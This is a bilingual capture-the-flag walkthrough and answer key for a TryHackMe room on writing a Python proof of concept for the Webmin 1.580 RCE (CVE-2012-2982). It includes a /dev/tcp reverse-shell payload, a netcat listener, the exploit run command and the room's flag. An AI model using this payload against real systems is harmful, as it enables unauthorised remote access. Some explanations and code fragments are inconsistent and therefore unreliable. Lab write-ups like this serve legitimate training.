# Intro PoC Scripting

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | walkthrough | `intropocscripting` | https://tryhackme.com/room/intropocscripting | 01 Level Easy | TryHackMe | searchsploit / Webmin 1.580 / CVE-2012-2982 / file/show.cgi / Python PoC (web.py) / reverse shell | Comprender y replicar un exploit público (Webmin 1.580) escribiendo tu propio script Proof of Concept en Python para obtener una shell del sistema. |

---

**Contexto:** La room enseña a escribir *Proof of Concept (PoC) scripts* tomando como base un exploit real: una vulnerabilidad de ejecución remota de código (RCE) en Webmin 1.580 (`CVE-2012-2982`) localizada en `file/show.cgi`. Usando `searchsploit` se localiza el exploit, se examina su código (autenticación vía `sid`/cookie, función `check`, payload encriptado con `rand_text_alphanumeric`) y se construye paso a paso el payload que lanza una reverse shell con `bash -c exec ... <&1`.

> **ES:** Escribir un script PoC para una RCE real: se audita la target con searchsploit (Webmin 1.580 / CVE-2012-2982 en file/show.cgi), se desarma el exploit público y se crea un payload propio en Python que devuelve una shell del sistema.
> **EN:** Write a PoC script for a real RCE: audit the target with searchsploit (Webmin 1.580 / CVE-2012-2982 in file/show.cgi), dissect the public exploit and build your own Python payload that returns a system shell.

## Solucionario

### Task 1: Introduction - What are PoC scripts? / Introducción - ¿Qué son los scripts PoC?

**Explicación:** Se introduce el concepto de Proof of Concept (PoC): una prueba a pequeña escala que demuestra la viabilidad de una idea (en este caso, una vulnerabilidad) con el menor esfuerzo posible. Se comparan los PoC con los exploits full-blown y se plantea el caso de estudio: un servidor Webmin vulnerable en el laboratorio. No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Read the introduction. / Lee la introducción de la room. | `No answer needed` |

### Task 2: Searchsploit

**Explicación:** Con `searchsploit` se buscan exploits para la target vulnerable. La plataforma es **Webmin 1.580** y el CVE asociado es **CVE-2012-2982**. La vulnerabilidad reside en el archivo **file/show.cgi** y, para explotarla, el programa/comando más efectivo es un **system shell**, ya que el CGI permite ejecutar comandos arbitrarios del sistema sin pasar siquiera por un binario tipo metasploit.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the target's platform and version number? / ¿Cuál es la plataforma de la target y su número de versión? | `Webmin 1.580` |
| 2 | What is the associated CVE for this platform? / ¿Cuál es el CVE asociado a esta plataforma? | `CVE-2012-2982` |
| 3 | Which file does the vulnerability exist in? / ¿En qué archivo existe la vulnerabilidad? | `file/show.cgi` |
| 4 | What program/command would be the most effective to use in this exploit? / ¿Qué programa/comando sería el más efectivo para usar en este exploit? | `system shell` |

### Task 3: Examining the exploit code / Examinando el código del exploit

**Explicación:** Se desarma el exploit público. La divulgación original fue el **September 6 2012**. Tras la petición POST inicial se espera un código **302** (redirección típica tras enviar credenciales con éxito). El `sid` es el **Session ID** usado para **autenticación**. Dentro de la función `check`, el código da **formato** a las cookies y, en la segunda petición de esa misma función, el método canalizado dentro del comando es `rand_text_alphanumeric` (que genera texto aleatorio para construir el payload).

```python
# fragmento ilustrativo de check(): formateo de cookies y canalización del comando
def check(host, port, session, cmd):
    # ...
    url = "http://%s:%s/file/show.cgi" % (host, port)
    # cookie formateada a partir del Session ID
    cookies = format(session)          # 'any' / formateo directo
    payload = rand_text_alphanumeric()
    # segunda petición: el método se canaliza (pipe) dentro del comando
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What's the original disclosure date of this exploit? / ¿Cuál es la fecha original de divulgación de este exploit? | `September 6 2012` |
| 2 | What HTTP response code do we expect after the initial POST request? / ¿Qué código de respuesta HTTP esperamos tras la petición POST inicial? | `302` |
| 3 | What does sid stand for and what is its purpose? / ¿Qué significa sid y cuál es su propósito? | `Session ID, authentication` |
| 4 | In the check function, what is it doing to the cookies? / En la función check, ¿qué se hace con las cookies? | `format` |
| 5 | In the second request of the check function, what method is piped into the command? / En la segunda petición de la función check, ¿qué método se canaliza dentro del comando? | `rand_text_alphanumeric` |

### Task 4: Crafting the payload / Creando el payload

**Explicación:** Se construye el payload de la reverse shell. La cabecera **Set-Cookie** (de la respuesta HTTP) es la que permite enviar una petición POST autenticada. El método para formatear las cookies en este ejemplo es un formateo **any** (directo con `%`), y el payload debe ser de tipo **string**. En lugar de `bash -i` se usa `bash -c exec` porque el flag `-i` **replaces current shell process**, y el `exec` lanza un proceso de shell no interactivo; el `<&1` sirve para **redirects socket output stream to bash input stream** (conecta la salida del socket como entrada del bash para el flujo bidireccional del shell).

```python
# construcción del payload (string) con redirección del socket al bash
payload = "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (lhost, lport)
# Set-Cookie: permite enviar la petición POST autenticada con el sid
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Which HTTP response header allows us to send an authenticated POST request? / ¿Qué cabecera HTTP de respuesta nos permite enviar una petición POST autenticada? | `Set-Cookie` |
| 2 | Which is the correct method for formatting cookies in this example? / ¿Cuál es el método correcto para formatear cookies en este ejemplo? | `any` |
| 3 | What data type does the payload need to be? / ¿Qué tipo de datos debe tener el payload? | `string` |
| 4 | Why do we need to use "bash -c exec" instead of just "bash -i"? / ¿Por qué necesitamos usar "bash -c exec" en lugar de solo "bash -i"? | `replaces current shell process` |
| 5 | What is the purpose of "<&1" in the payload function? / ¿Cuál es el propósito de "<&1" en la función del payload? | `redirects socket output stream to bash input stream` |

### Task 5: Run the exploit / Ejecutando el exploit

**Explicación:** Se ejecuta el script PoC contra la target Webmin y se escucha la conexión entrante con netcat. Si el payload es correcto, la shell del sistema se recibe en nuestra máquina y permite leer la flag de `/root/root.txt`.

```bash
nc -lvnp 1337
python3 web.py MACHINE_IP 10000
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Run the program and listen for the shell. What is the /root/root.txt flag? / Ejecuta el programa y escucha la shell. ¿Cuál es la flag de /root/root.txt? | `THM{ur_So_1337!@#$}` |

### Task 6: No questions here / Sin preguntas aquí

**Explicación:** Tarea de recapitulación de algunos conceptos vistos en la room, sin preguntas asociadas. No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Recapitula el contenido de la tarea. | `No answer needed` |

### Task 7: Further reading / Lectura adicional

**Explicación:** Se enlazan recursos adicionales sobre diseño de shells y scripteo para seguir profundizando. No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Revisa las lecturas complementarias. | `No answer needed` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the target's platform and version number? | `Webmin 1.580` |
| 2 | What is the associated CVE for this platform? | `CVE-2012-2982` |
| 3 | Which file does the vulnerability exist in? | `file/show.cgi` |
| 4 | What program/command would be the most effective to use in this exploit? | `system shell` |
| 5 | What's the original disclosure date of this exploit? | `September 6 2012` |
| 6 | What HTTP response code do we expect after the initial POST request? | `302` |
| 7 | What does sid stand for and what is its purpose? | `Session ID, authentication` |
| 8 | In the check function, what is it doing to the cookies? | `format` |
| 9 | In the second request of the check function, what method is piped into the command? | `rand_text_alphanumeric` |
| 10 | Which HTTP response header allows us to send an authenticated POST request? | `Set-Cookie` |
| 11 | Which is the correct method for formatting cookies in this example? | `any` |
| 12 | What data type does the payload need to be? | `string` |
| 13 | Why do we need to use "bash -c exec" instead of just "bash -i"? | `replaces current shell process` |
| 14 | What is the purpose of "<&1" in the payload function? | `redirects socket output stream to bash input stream` |
| 15 | Run the program and listen for the shell. What is the /root/root.txt flag? | `THM{ur_So_1337!@#$}` |

---

**Metodología:** De PoC conceptual a explotación práctica: (1) auditoría con `searchsploit` para identificar plataforma, CVE y archivo vulnerable; (2) lectura del exploit público para entender autenticación y flujo HTTP (POST + Set-Cookie/sid, respuesta 302); (3) reescritura del payload en Python (string, `rand_text_alphanumeric`) con reverse shell vía `bash -c exec ... <&1`; (4) ejecución del PoC y captura de la shell con netcat para leer `root.txt`.

### Cadena de ataque / Attack Chain

```text
searchsploit Webmin 1.580 -> CVE-2012-2982 (file/show.cgi) -> POST autenticado (sid + Set-Cookie) -> payload string -> bash -c exec ...<&1 reverse shell -> nc -lvnp -> cat /root/root.txt
```

**Learning chain:** PoC scripting -> searchsploit -> análisis del exploit -> cookies/sid -> payload -> reverse shell -> flag.

**Lección:** *Un exploit público no es una caja negra: entender su autenticación, formato de cookies y mecanismo de la shell permite reescribirlo como un PoC propio y depurarlo cuando las cosas no funcionan a la primera.*

**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter), T1203 (Exploitation for Client Execution), T1071 (Application Layer Protocol)

**Fuente:** [TryHackMe - Intro PoC Scripting](https://tryhackme.com/room/intropocscripting)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.